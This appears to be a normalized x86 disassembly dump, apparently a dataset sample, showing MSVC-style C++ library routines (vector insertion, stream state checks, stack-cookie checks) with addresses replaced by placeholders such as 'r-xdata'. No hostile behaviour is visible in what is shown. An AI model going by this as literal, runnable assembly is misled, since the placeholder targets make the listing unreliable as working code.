mov ecx [ ebp - 0x20 ]
call sub_415e90
sub eax esi
cmp eax [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp - 0x40 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
lea edx [ ebp - 0x44 ]
push edx
mov ecx [ ebp - 0x20 ]
call sub_414fb0
mov ecx eax
call sub_416020
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x10
push 0x1
lea ecx [ ebp - 0x1c ]
call sub_40e0b0
mov edx [ ebp + 0x14 ]
mov eax [ edx ]
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x20 ]
mov edx [ ecx + 0x4 ]
mov [ ebp - 0x30 ] edx
mov eax [ ebp - 0x20 ]
mov ecx [ eax + 0x4 ]
push ecx
mov edx [ ebp - 0x30 ]
push edx
mov eax [ ebp + 0x10 ]
shl eax 0x2
mov ecx [ ebp - 0x30 ]
sub ecx eax
push ecx
mov ecx [ ebp - 0x20 ]
call sub_416dd0
mov edx [ ebp - 0x20 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax + 0x4 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp - 0x20 ]
call sub_415f80
mov eax [ ebp - 0x30 ]
push eax
mov ecx [ ebp + 0x10 ]
shl ecx 0x2
mov edx [ ebp - 0x30 ]
sub edx ecx
push edx
mov eax [ ebp + 0xc ]
push eax
call sub_416e50
add esp 0xc
lea ecx [ ebp - 0x1c ]
push ecx
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
lea ecx [ eax + edx * 4 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
call sub_416e20
add esp 0xc
push 0x1
lea ecx [ ebp - 0x18 ]
call sub_40e0b0
mov ecx [ ebp + 0x14 ]
mov edx [ ecx ]
mov [ ebp - 0x18 ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
lea edx [ ecx + eax * 4 ]
push edx
mov eax [ ebp - 0x20 ]
mov ecx [ eax + 0x4 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp - 0x20 ]
call sub_416dd0
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp - 0x18 ]
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp - 0x20 ]
mov edx [ ecx + 0x4 ]
sub edx [ ebp + 0xc ]
sar edx 0x2
mov eax [ ebp + 0x10 ]
sub eax edx
push eax
mov ecx [ ebp - 0x20 ]
mov edx [ ecx + 0x4 ]
push edx
mov ecx [ ebp - 0x20 ]
call sub_415f10
jmp r-xdata
mov ecx [ ebp - 0x20 ]
call sub_415e70
add eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp - 0x20 ]
call sub_415eb0
mov [ ebp - 0x38 ] eax
mov edx [ ebp - 0x38 ]
push edx
lea eax [ ebp - 0x39 ]
push eax
mov ecx [ ebp - 0x20 ]
call sub_4151c0
mov ecx eax
call sub_415f90
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x20 ]
mov edx [ ebp + 0xc ]
sub edx [ ecx ]
sar edx 0x2
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x14 ]
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x24 ]
lea ecx [ eax + edx * 4 ]
push ecx
mov ecx [ ebp - 0x20 ]
call sub_415f10
mov edx [ ebp - 0x28 ]
add edx 0x1
mov [ ebp - 0x28 ] edx
mov eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp - 0x20 ]
mov eax [ edx ]
push eax
mov ecx [ ebp - 0x20 ]
call sub_416dd0
mov ecx [ ebp - 0x28 ]
add ecx 0x1
mov [ ebp - 0x28 ] ecx
mov edx [ ebp - 0x2c ]
add edx [ ebp + 0x10 ]
mov eax [ ebp - 0x24 ]
lea ecx [ eax + edx * 4 ]
push ecx
mov edx [ ebp - 0x20 ]
mov eax [ edx + 0x4 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp - 0x20 ]
call sub_416dd0
jmp r-xdata
mov ecx [ ebp - 0x20 ]
call sub_415f60
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x20 ]
mov edx [ ecx + 0x4 ]
mov eax [ ebp + 0x10 ]
lea ecx [ edx + eax * 4 ]
mov edx [ ebp - 0x20 ]
mov [ edx + 0x4 ] ecx
mov eax [ ebp - 0x20 ]
mov ecx [ eax + 0x4 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp - 0x20 ]
call sub_415f80
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x10 ]
shl ecx 0x2
mov edx [ ebp - 0x20 ]
mov eax [ edx + 0x4 ]
sub eax ecx
push eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_416e20
add esp 0xc
jmp r-xdata
mov ecx [ ebp - 0x20 ]
call sub_415e70
add eax [ ebp + 0x10 ]
mov [ ebp + 0x10 ] eax
mov edx [ ebp - 0x20 ]
cmp [ edx ] 0x0
je r-xdata
mov ecx [ ebp - 0x20 ]
call sub_40cb60
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x24 ]
lea eax [ edx + ecx * 4 ]
mov ecx [ ebp - 0x20 ]
mov [ ecx + 0x8 ] eax
mov edx [ ebp + 0x10 ]
mov eax [ ebp - 0x24 ]
lea ecx [ eax + edx * 4 ]
mov edx [ ebp - 0x20 ]
mov [ edx + 0x4 ] ecx
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x24 ]
mov [ eax ] ecx
jmp r-xdata
mov eax [ ebp - 0x20 ]
mov ecx [ eax + 0x4 ]
push ecx
mov edx [ ebp - 0x20 ]
mov eax [ edx ]
push eax
mov ecx [ ebp - 0x20 ]
call sub_415150
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x20 ]
mov eax [ ecx + 0x8 ]
sub eax [ edx ]
sar eax 0x2
push eax
mov ecx [ ebp - 0x20 ]
mov edx [ ecx ]
push edx
lea eax [ ebp - 0x31 ]
push eax
mov ecx [ ebp - 0x20 ]
call sub_4151c0
mov ecx eax
call sub_4151e0
sub_415987
cmp [ ebp - 0x28 ] 0x1
jle r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x24 ]
lea ecx [ eax + edx * 4 ]
push ecx
mov edx [ ebp - 0x24 ]
push edx
mov ecx [ ebp - 0x20 ]
call sub_415150
mov edx [ ebp - 0x38 ]
push edx
mov eax [ ebp - 0x24 ]
push eax
lea ecx [ ebp - 0x32 ]
push ecx
mov ecx [ ebp - 0x20 ]
call sub_4151c0
mov ecx eax
call sub_4151e0
push 0x0
push 0x0
call sub_42569b
mov eax r-xdata
retn
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
lea edx [ ecx + eax * 4 ]
mov eax [ ebp + 0x10 ]
lea ecx [ edx + eax * 4 ]
push ecx
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x24 ]
lea ecx [ eax + edx * 4 ]
push ecx
mov ecx [ ebp - 0x20 ]
call sub_415150
sub_415b06
mov eax [ ebp - 0x20 ]
mov ecx [ eax + 0x4 ]
mov edx [ ebp + 0x10 ]
lea eax [ ecx + edx * 4 ]
push eax
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
lea eax [ edx + ecx * 4 ]
push eax
mov ecx [ ebp - 0x20 ]
call sub_415150
push 0x0
push 0x0
call sub_42569b
mov eax r-xdata
retn
sub_415cb0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_4022a0
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx ]
cmp eax [ edx ]
jne r-xdata
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
mov al [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_415cf0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
call sub_415cb0
movzx ecx al
test ecx ecx
jne r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov al [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
sub_415d30
push ebp
mov ebp esp
push 0xffffffff
push sub_43b970
mov eax [ fs : 0x0 ]
push eax
push ecx
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x1c ] ecx
push 0x1
lea eax [ ebp - 0x11 ]
push eax
mov ecx [ ebp - 0x1c ]
call sub_401a60
mov ecx eax
call sub_416070
mov [ ebp - 0x18 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x18 ]
push eax
call sub_402180
add esp 0x4
mov [ ebp - 0x20 ] eax
lea ecx [ ebp - 0x12 ]
push ecx
mov ecx [ ebp - 0x1c ]
call sub_401a60
mov [ ebp - 0x24 ] eax
lea edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x20 ]
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp - 0x24 ]
call sub_402130
mov ecx [ ebp - 0x18 ]
push ecx
call sub_414860
add esp 0x4
mov [ ebp - 0x28 ] eax
lea edx [ ebp - 0x13 ]
push edx
mov ecx [ ebp - 0x1c ]
call sub_401a60
mov [ ebp - 0x2c ] eax
lea eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x28 ]
push ecx
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp - 0x2c ]
call sub_402130
jmp r-xdata
mov ecx [ ebp - 0x18 ]
mov [ ebp + 0x8 ] ecx
mov edx [ ebp - 0x18 ]
mov [ ebp + 0xc ] edx
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_415e00
push 0x1
mov edx [ ebp - 0x18 ]
push edx
lea eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x1c ]
call sub_401a60
mov ecx eax
call sub_401d80
push 0x0
push 0x0
call sub_42569b
mov eax r-xdata
retn
sub_415e90
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
lea eax [ ebp - 0x1 ]
push eax
mov ecx [ ebp - 0x8 ]
call sub_4151c0
mov ecx eax
call sub_4160b0
mov esp ebp
pop ebp
retn
sub_415eb0
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
call sub_416090
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
call sub_415e90
mov ecx [ ebp - 0x4 ]
shr ecx 0x1
sub eax ecx
cmp eax [ ebp - 0x4 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
shr edx 0x1
add edx [ ebp - 0x4 ]
mov [ ebp - 0xc ] edx
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + 0x8 ]
jae r-xdata
sub_415f10
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ecx
lea eax [ ebp - 0x5 ]
push eax
mov ecx [ ebp - 0xc ]
call sub_4151c0
lea ecx [ ebp - 0x5 ]
push ecx
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_416ed0
add esp 0x10
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
lea eax [ eax + edx * 4 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0xc
sub_415fc0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_4022a0
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx ]
sub eax [ edx ]
mov esp ebp
pop ebp
retn 0x4
sub_415ff0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_4022a0
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx ]
sub eax [ edx ]
sar eax 0x1
mov esp ebp
pop ebp
retn 0x4
sub_416020
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ecx
push 0x1
lea ecx [ ebp - 0x8 ]
call sub_40e0b0
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0xc ]
push edx
lea ecx [ ebp - 0x8 ]
call sub_4160d0
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x8
sub_416130
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
lea eax [ ecx + edx * 4 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
sub_416150
push ebp
mov ebp esp
push 0xffffffff
push sub_43b1b8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_42168a
mov [ ebp - 0x4 ] 0x0
mov eax [ rw-data ]
mov [ ebp - 0x18 ] eax
mov ecx rw-data
call sub_40cf90
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x24 ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_40d1c0
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x18 ]
push ecx
call sub_40d4b0
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov edx [ ebp - 0x18 ]
mov [ ebp - 0x1c ] edx
jmp r-xdata
mov edx [ ebp - 0x1c ]
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_4216e6
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x18 ]
mov [ rw-data ] ecx
mov edx [ ebp - 0x18 ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
mov ecx [ ebp - 0x20 ]
mov eax [ edx + 0x4 ]
call eax
mov ecx [ ebp - 0x20 ]
push ecx
call sub_42181e
add esp 0x4
push r--data
lea ecx [ ebp - 0x34 ]
call sub_423912
push r--data
lea edx [ ebp - 0x34 ]
push edx
call sub_42569b
jmp r-xdata
sub_416260
push ebp
mov ebp esp
push 0xffffffff
push sub_43b0c8
mov eax [ fs : 0x0 ]
push eax
push ecx
sub esp 0x64
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x20 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_401890
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
add edx [ ecx + 0x4 ]
mov ecx edx
call sub_40db20
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x50 ] edx
cmp [ ebp - 0x50 ] 0x0
jl r-xdata
mov [ ebp - 0x30 ] 0x0
jg r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
add edx [ ecx + 0x4 ]
mov ecx edx
call sub_40db00
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x44 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov edx [ ebp - 0x20 ]
or edx 0x4
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
add edx [ ecx + 0x4 ]
mov ecx edx
call sub_40db20
cmp eax [ ebp - 0x2c ]
jbe r-xdata
cmp [ ebp - 0x54 ] 0x0
jbe r-xdata
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
jmp r-xdata
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov ecx [ ebp + 0x8 ]
add ecx [ edx + 0x4 ]
call sub_410690
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x1c ]
call sub_413ea0
mov eax [ ebp - 0x48 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
add edx [ ecx + 0x4 ]
mov ecx edx
call sub_40db20
sub eax [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
add edx [ ecx + 0x4 ]
mov ecx edx
call sub_4106c0
mov [ ebp - 0x70 ] eax
mov eax [ ebp - 0x2c ]
xor ecx ecx
push ecx
push eax
mov ecx [ ebp + 0xc ]
call sub_401870
push eax
mov ecx [ ebp - 0x70 ]
call sub_417110
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x5c ] edx
mov edx [ ebp - 0x2c ]
xor eax eax
mov [ ebp - 0x6c ] edx
mov [ ebp - 0x68 ] eax
mov ecx [ ebp - 0x60 ]
cmp ecx [ ebp - 0x6c ]
jne r-xdata
cmp [ ebp - 0x28 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x28 ] eax
mov ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x1c ]
call sub_413df0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x1c ]
call sub_4107d0
cmp eax 0xffffffff
jne r-xdata
cmp [ ebp - 0x28 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
or eax 0x4
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov edx [ ebp - 0x5c ]
cmp edx [ ebp - 0x68 ]
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ ebp + 0x8 ]
add ecx [ eax + 0x4 ]
call sub_4170f0
mov [ ebp - 0x22 ] al
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov ecx [ ebp + 0x8 ]
add ecx [ edx + 0x4 ]
call sub_4106c0
mov [ ebp - 0x74 ] eax
movzx eax [ ebp - 0x22 ]
push eax
mov ecx [ ebp - 0x74 ]
call sub_412d90
mov [ ebp - 0x3c ] eax
mov ecx [ ebp - 0x3c ]
mov [ ebp - 0x58 ] ecx
call sub_40cb50
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x58 ]
push edx
lea eax [ ebp - 0x34 ]
push eax
call sub_40cad0
add esp 0x8
movzx ecx al
test ecx ecx
je r-xdata
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
add edx [ ecx + 0x4 ]
mov ecx edx
call sub_40db40
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ ebp + 0x8 ]
add ecx [ eax + 0x4 ]
call sub_4170f0
mov [ ebp - 0x21 ] al
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov ecx [ ebp + 0x8 ]
add ecx [ edx + 0x4 ]
call sub_4106c0
mov [ ebp - 0x4c ] eax
movzx eax [ ebp - 0x21 ]
push eax
mov ecx [ ebp - 0x4c ]
call sub_412d90
mov [ ebp - 0x64 ] eax
mov ecx [ ebp - 0x64 ]
mov [ ebp - 0x38 ] ecx
call sub_40cb50
mov [ ebp - 0x40 ] eax
lea edx [ ebp - 0x38 ]
push edx
lea eax [ ebp - 0x40 ]
push eax
call sub_40cad0
add esp 0x8
movzx ecx al
test ecx ecx
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x20 ]
or edx 0x4
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x20 ]
or edx 0x4
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov ecx [ ebp - 0x28 ]
sub ecx 0x1
mov [ ebp - 0x28 ] ecx
mov ecx [ ebp - 0x28 ]
sub ecx 0x1
mov [ ebp - 0x28 ] ecx
sub_416540
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_410290
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov al [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_416570
push ebp
mov ebp esp
push 0xffffffff
push sub_43b0f8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x2c ] 0x0
lea ecx [ ebp - 0x28 ]
call sub_40ffa0
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_401890
mov esi eax
mov eax [ ebp + 0x10 ]
push eax
call sub_401020
add esp 0x4
add esi eax
push esi
lea ecx [ ebp - 0x28 ]
call sub_4170a0
mov ecx [ ebp + 0xc ]
push ecx
lea ecx [ ebp - 0x28 ]
call sub_416f70
mov edx [ ebp + 0x10 ]
push edx
lea ecx [ ebp - 0x28 ]
call sub_4101d0
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_410020
mov ecx [ ebp - 0x2c ]
or ecx 0x1
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_401830
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
sub_416630
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0x10 ]
call sub_401890
mov esi eax
mov ecx [ ebp + 0xc ]
call sub_40db00
mov edi eax
mov ecx [ ebp + 0xc ]
call sub_401890
sub edi eax
cmp esi edi
jbe r-xdata
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
call sub_416f90
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp + 0x8 ]
call sub_410020
mov ecx [ ebp - 0x4 ]
or ecx 0x1
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_40db00
mov esi eax
mov ecx [ ebp + 0x10 ]
call sub_401890
sub esi eax
mov ecx [ ebp + 0xc ]
call sub_401890
cmp esi eax
jae r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0xc ]
push edx
push 0x0
mov ecx [ ebp + 0x10 ]
call sub_416fb0
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp + 0x8 ]
call sub_410020
mov eax [ ebp - 0x4 ]
or eax 0x1
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
sub_4166e0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
call sub_416f90
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp + 0x8 ]
call sub_410020
mov ecx [ ebp - 0x4 ]
or ecx 0x1
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
sub_416720
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
call sub_412300
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp + 0x8 ]
call sub_410020
mov ecx [ ebp - 0x4 ]
or ecx 0x1
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
sub_416760
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_416540
add esp 0x8
movzx edx al
test edx edx
jne r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov al [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_4167a0
push ebp
mov ebp esp
push 0xffffffff
push sub_43b0f8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x2c ] 0x0
lea ecx [ ebp - 0x28 ]
call sub_40ffa0
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
push eax
call sub_401020
add esp 0x4
mov esi eax
mov ecx [ ebp + 0x10 ]
call sub_401890
add esi eax
push esi
lea ecx [ ebp - 0x28 ]
call sub_4170a0
mov ecx [ ebp + 0xc ]
push ecx
lea ecx [ ebp - 0x28 ]
call sub_4101d0
mov edx [ ebp + 0x10 ]
push edx
lea ecx [ ebp - 0x28 ]
call sub_416f70
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_410020
mov ecx [ ebp - 0x2c ]
or ecx 0x1
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_401830
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
sub_416860
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_417ec0
add esp 0x8
movzx edx al
test edx edx
jne r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov al [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_4168a0
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_412410
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
lea edx [ ebp - 0x14 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_4123e0
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_416fe0
mov esp ebp
pop ebp
retn 0x8
sub_4168f0
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_413150
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
lea edx [ ebp - 0x14 ]
push edx
